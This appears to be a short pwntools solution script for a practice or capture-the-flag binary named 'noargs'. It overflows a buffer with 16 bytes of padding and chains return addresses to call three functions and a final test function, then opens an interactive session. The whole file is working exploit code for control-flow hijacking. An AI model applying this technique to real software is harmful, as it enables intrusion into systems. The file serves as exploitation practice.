from pwn import *

p = process("./noargs")

EGG = "A"*16 # Offset to return address

EGG += p32(0x080484b6) # Add address for f1
EGG += p32(0x080484eb) # Add address for f2
EGG += p32(0x08048520) # Add address for f3
EGG += p32(0x08048555) # Call test it

p.sendline(EGG)

p.interactive()